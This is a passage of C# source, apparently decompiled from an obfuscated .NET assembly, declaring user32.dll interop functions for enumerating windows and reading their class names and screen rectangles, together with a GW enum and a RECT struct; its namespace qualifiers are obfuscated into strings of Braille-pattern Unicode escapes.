        \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      public static extern uint RealGetWindowClass(
        IntPtr hwnd,
        [Out] StringBuilder pszType,
        uint cchType);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool GetWindowRect(
        IntPtr hwnd,
        out \u28B4\u28C0\u2886\u2826\u2840\u2830\u2844\u2803\u2844\u289C\u2899\u28CC\u28D2\u283F\u28D2\u28A2\u280D\u28C4\u28DE\u2806\u28B9\u28A0\u2853\u288A\u28D4\u282C\u280F\u2822\u286F\u28D0\u2870\u289D\u28B7\u285D\u280D\u28DB\u28CB\u2869\u2815\u289B\u2881\u2852\u288D.RECT lpRect);
    }

    public enum GW
    {
      HWNDFIRST,
      HWNDLAST,
      HWNDNEXT,
      HWNDPREV,
      OWNER,
      CHILD,
    }

    public struct RECT
    {
      public int left;
      public int top;
      public int right;
      public int bottom;
    }
  }
}
